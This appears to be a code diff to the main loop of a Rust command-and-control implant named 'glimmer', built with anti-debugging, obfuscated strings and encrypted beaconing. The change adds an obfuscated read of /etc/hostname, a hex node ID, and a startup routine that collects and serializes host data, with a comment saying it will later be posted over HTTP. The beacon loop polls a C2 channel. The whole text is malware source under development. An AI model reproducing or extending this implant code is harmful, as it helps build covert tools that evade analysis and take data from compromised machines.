@@ -2,10 +2,13 @@ use glimmer::antidebug;
 use glimmer::c2::http::HTTPChannel;
 use glimmer::c2::{Channel, SendContext};
 use glimmer::cfg::Config;
+use glimmer::collect;
 use glimmer::crypto::{self, TimeBasedKey};
 use glimmer::identity;
 use glimmer::proto::{CheckinData, Envelope, MsgType};
 use glimmer::sys;
+use glimmer_obfstr::obfs;
+
 
 fn main() {
 
@@ -23,11 +26,13 @@ fn main() {
         }
     };
 
-    let host = sys::read_file_string(
-        &glimmer::strings::decode_str(glimmer::strings::ETC_HOSTNAME)
-    ).unwrap_or_else(|_| "unknown".into());
+    // let host = sys::read_file_string(
+    //     &glimmer::strings::decode_str(glimmer::strings::ETC_HOSTNAME)
+    // ).unwrap_or_else(|_| "unknown".into());
 
+    let host = sys::read_file_string(obfs!("/etc/hostname").as_str()).unwrap_or_else(|_| "unknown".into());
     let node_id = identity::generate_with_hostname(&host);
+    let node_id_s = hex::encode(&node_id[..8]);
 
     let server_pub = match config.server_public_key_bytes() {
         Ok(k) => k,
@@ -61,7 +66,7 @@ fn main() {
         pub_key: vec![],
     };
 
-    let time_key = match bootstrap(&node_id, &checkin, &server_pub, &channel) {
+    let time_key = match bootstrap(&node_id_s, &checkin, &server_pub, &channel) {
         Ok(tk) => {
             glimmer::dbg_log!("[beacon] bootstrap complete, time-based key established");
             tk
@@ -71,6 +76,14 @@ fn main() {
             std::process::exit(1);
         }
     };
+
+    // Testing running full collection loop and posting to http on startup (will move to tasking)
+    let items = collect::collect_all();
+    // let node_id = identity::generate_with_hostname(&host);
+    let collection = collect::build_collection(items, node_id);
+    let _json = serde_json::to_vec(&collection).unwrap();
+    glimmer::dbg_log!("collection: {} items, {} bytes serialized", collection.items.len(), _json.len());
+    // glimmer::dbg_log!("collection: {}", String::from_utf8_lossy(&_json));
 
     // DNF beacon channel
     let dnf_channel = glimmer::c2::dnf::DnfChannel::new("localhost", 8080);
@@ -88,7 +101,7 @@ fn main() {
         // send beacon over active channel configured for communications
         match send_layered(
             MsgType::Beacon,
-            &node_id,
+            &node_id_s,
             None::<&()>,
             &time_key,
             &server_pub,
@@ -114,7 +127,6 @@ fn main() {
                 glimmer::dbg_log!("[beacon] dnf poll error: {}", _e);
             }
         }
-
     }
 }
 
